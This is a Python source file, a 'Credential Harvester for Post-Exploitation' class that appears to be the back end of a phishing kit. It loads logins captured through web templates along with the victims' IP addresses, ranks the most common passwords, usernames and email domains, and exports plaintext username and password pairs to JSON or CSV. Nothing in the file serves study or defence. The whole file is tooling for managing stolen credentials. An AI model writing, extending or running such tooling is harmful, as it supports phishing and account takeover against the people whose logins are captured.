#!/usr/bin/env python3
"""
Credential Harvester for Post-Exploitation
Analyzes and manages captured credentials
"""

import os
import json
import re
import time
from colorama import Fore, Style
import logging
from collections import defaultdict
import hashlib

class CredentialHarvester:
    def __init__(self):
        self.credentials = []
        self.analyzed_data = {}
        self.logger = logging.getLogger('cred_harvester')
        
        # Load existing credentials
        self.load_credentials()
    
    def load_credentials(self):
        """Load captured credentials from log files"""
        creds_dir = "logs/credentials"
        
        if not os.path.exists(creds_dir):
            os.makedirs(creds_dir)
            return
        
        for filename in os.listdir(creds_dir):
            if filename.endswith('.json'):
                filepath = os.path.join(creds_dir, filename)
                try:
                    with open(filepath, 'r') as f:
                        for line in f:
                            try:
                                cred_data = json.loads(line.strip())
                                self.credentials.append(cred_data)
                            except json.JSONDecodeError:
                                continue
                except Exception as e:
                    self.logger.error(f"Error loading {filename}: {e}")
    
    def analyze_captured_data(self):
        """Analyze captured credentials for patterns"""
        print(f"{Fore.CYAN}[*] Analyzing captured credentials...{Style.RESET_ALL}")
        
        analysis = {
            'total_credentials': len(self.credentials),
            'unique_ips': set(),
            'common_passwords': defaultdict(int),
            'common_usernames': defaultdict(int),
            'password_lengths': defaultdict(int),
            'credential_sources': defaultdict(int),
            'email_domains': defaultdict(int)
        }
        
        for cred in self.credentials:
            # Count unique IPs
            analysis['unique_ips'].add(cred.get('client_ip', 'Unknown'))
            
            # Analyze form data
            form_data = cred.get('form_data', {})
            analysis['credential_sources'][cred.get('template', 'unknown')] += 1
            
            for field, value in form_data.items():
                field_lower = field.lower()
                
                # Password analysis
                if 'pass' in field_lower:
                    analysis['common_passwords'][value] += 1
                    analysis['password_lengths'][len(value)] += 1
                
                # Username analysis  
                elif 'user' in field_lower or 'name' in field_lower:
                    analysis['common_usernames'][value] += 1
                    
                    # Email domain analysis
                    if '@' in value:
                        domain = value.split('@')[-1]
                        analysis['email_domains'][domain] += 1
        
        # Convert sets to counts
        analysis['unique_ip_count'] = len(analysis['unique_ips'])
        
        # Sort common items
        analysis['top_passwords'] = sorted(
            analysis['common_passwords'].items(), 
            key=lambda x: x[1], 
            reverse=True
        )[:10]
        
        analysis['top_usernames'] = sorted(
            analysis['common_usernames'].items(),
            key=lambda x: x[1],
            reverse=True
        )[:10]
        
        analysis['top_domains'] = sorted(
            analysis['email_domains'].items(),
            key=lambda x: x[1], 
            reverse=True
        )[:5]
        
        self.analyzed_data = analysis
        self.print_analysis()
        
        return analysis
    
    def print_analysis(self):
        """Print credential analysis results"""
        analysis = self.analyzed_data
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}            CREDENTIAL ANALYSIS REPORT{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}Total Credentials Captured: {analysis['total_credentials']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Unique Client IPs: {analysis['unique_ip_count']}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Top Credential Sources:{Style.RESET_ALL}")
        for source, count in analysis['credential_sources'].items():
            print(f"  {source}: {count} credentials")
        
        if analysis['top_passwords']:
            print(f"\n{Fore.YELLOW}Most Common Passwords:{Style.RESET_ALL}")
            for password, count in analysis['top_passwords']:
                strength = self.assess_password_strength(password)
                print(f"  {password} ({count}) - {strength}")
        
        if analysis['top_usernames']:
            print(f"\n{Fore.YELLOW}Most Common Usernames:{Style.RESET_ALL}")
            for username, count in analysis['top_usernames']:
                print(f"  {username} ({count})")
        
        if analysis['top_domains']:
            print(f"\n{Fore.YELLOW}Most Common Email Domains:{Style.RESET_ALL}")
            for domain, count in analysis['top_domains']:
                print(f"  {domain} ({count})")
        
        print(f"\n{Fore.YELLOW}Password Length Distribution:{Style.RESET_ALL}")
        for length, count in sorted(analysis['password_lengths'].items()):
            print(f"  {length} chars: {count} passwords")
    
    def assess_password_strength(self, password):
        """Assess password strength"""
        score = 0
        
        if len(password) >= 8:
            score += 1
        if re.search(r'[A-Z]', password):
            score += 1
        if re.search(r'[a-z]', password):
            score += 1  
        if re.search(r'[0-9]', password):
            score += 1
        if re.search(r'[^A-Za-z0-9]', password):
            score += 1
        
        if score <= 2:
            return f"{Fore.RED}Weak{Style.RESET_ALL}"
        elif score <= 4:
            return f"{Fore.YELLOW}Medium{Style.RESET_ALL}"
        else:
            return f"{Fore.GREEN}Strong{Style.RESET_ALL}"
    
    def export_credentials(self, format='json', filename=None):
        """Export credentials in specified format"""
        if not filename:
            timestamp = int(time.time())
            filename = f"credential_export_{timestamp}.{format}"
        
        if format == 'json':
            with open(filename, 'w') as f:
                json.dump(self.credentials, f, indent=2)
        
        elif format == 'csv':
            import csv
            with open(filename, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Timestamp', 'Client IP', 'Username', 'Password', 'Source'])
                
                for cred in self.credentials:
                    form_data = cred.get('form_data', {})
                    username = ''
                    password = ''
                    
                    for field, value in form_data.items():
                        if 'user' in field.lower() or 'name' in field.lower():
                            username = value
                        elif 'pass' in field.lower():
                            password = value
                    
                    writer.writerow([
                        cred.get('timestamp', ''),
                        cred.get('client_ip', ''),
                        username,
                        password, 
                        cred.get('template', '')
                    ])
        
        print(f"{Fore.GREEN}[+] Credentials exported to: {filename}{Style.RESET_ALL}")
        return filename
    
    def search_credentials(self, query):
        """Search credentials for specific terms"""
        results = []
        query_lower = query.lower()
        
        for cred in self.credentials:
            # Search in all fields
            found = False
            
            # Search in form data
            form_data = cred.get('form_data', {})
            for field, value in form_data.items():
                if query_lower in str(value).lower() or query_lower in field.lower():
                    found = True
                    break
            
            # Search in other fields
            if (query_lower in cred.get('client_ip', '').lower() or
                query_lower in cred.get('template', '').lower()):
                found = True
            
            if found:
                results.append(cred)
        
        print(f"{Fore.CYAN}[*] Found {len(results)} credentials matching '{query}'{Style.RESET_ALL}")
        return results
    
    def get_stats(self):
        """Get credential statistics"""
        return self.analyzed_data